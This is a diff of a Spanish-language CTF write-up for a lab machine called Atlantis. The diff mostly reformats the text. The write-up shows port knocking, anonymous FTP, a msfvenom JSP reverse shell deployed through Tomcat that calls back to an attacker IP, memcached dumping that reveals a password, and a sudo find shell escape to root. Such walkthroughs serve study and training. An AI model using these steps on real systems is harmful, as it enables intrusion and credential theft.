@@ -6,14 +6,14 @@
 ## Enumeracion de Puertos y Servicios
 
 ### PUERTOS
-
+~~~
 PORT     STATE SERVICE
 22/tcp   open  ssh
 80/tcp   open  http
 8009/tcp open  ajp13
 8080/tcp open  http-proxy
+~~~
 
--------------------------
 ### SERVICIOS
 
 ~~~
@@ -140,15 +140,17 @@ con for golpeamos los puertos
 for i in 1100 800 666; do nmap -Pn --max-retries 0 -p $i 192.168.2.242; done
 
 y se nos abre el puerto 21 ftp
+~~~
 PORT     STATE SERVICE
 21/tcp   open  ftp
 22/tcp   open  ssh
 80/tcp   open  http
 8009/tcp open  ajp13
 8080/tcp open  http-proxy
+~~~
 
 comprobamos el puerto 21 con nmap 
-#-------------------------------
+~~~
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
@@ -166,14 +168,14 @@ PORT   STATE SERVICE VERSION
 |      At session startup, client count was 4
 |      vsFTPd 3.0.3 - secure, fast, stable
 |_End of status
+~~~
 
 tenemos acceso como usuario anonymous
 
 
-#------------------------------
-# FTP
-#--------------------------------
-❯ ftp 192.168.2.242
+## FTP
+
+> ftp 192.168.2.242
 Connected to 192.168.2.242.
 220 (vsFTPd 3.0.3)
 Name (192.168.2.242:h1dr0): anonymous
@@ -220,6 +222,8 @@ con estas credenciales accedemos al servicio tomcat
 
 como veremos podemos hacer un deploy de un archivo war que con msfvenom crearemos.
 
+## MSFVENOM
+
 ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.55 LPORT=443 -f war -o shell.war
 Payload size: 1091 bytes
 Final size of war file: 1091 bytes
@@ -254,7 +258,7 @@ stty rows 57 columns 212
 
 si le hacemos un ps aux verermos que usa memcached
 
-/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
+'/usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1'
 
 probaremos a entrar nc localhost 11211
 
@@ -266,7 +270,7 @@ nos hace un volcado de memoria y veremos mas informacion
 
 con get y el item que queremos nos lo reportara
 
-stats cachedump 1 100
+'stats cachedump 1 100
 ITEM email [17 b; 0 s]
 ITEM Name [14 b; 0 s]
 ITEM password [18 b; 0 s]
@@ -279,7 +283,7 @@ END
 get password
 VALUE password 0 18
 N3ptun0D10sd3lM4r$
-END
+END'
 
 si miramos el /etc/passwd veremos quiene es el user Poseidon perez
 
@@ -303,11 +307,11 @@ User tridente may run the following commands on Atlantis:
 
 tridente@Atlantis:~$ sudo -u root /home/tridente/find . -exec /bin/sh \; -quit
 [sudo] password for tridente: 
-# id;whoami;hostname
+\# id;whoami;hostname
 uid=0(root) gid=0(root) groups=0(root)
 root
 Atlantis
-#
+\#
 
 si miramos la flag esta encriptada  la pasaremos a nuestra terminal Y usaremos gpg2john y luego con john intentamos romperlo.
 
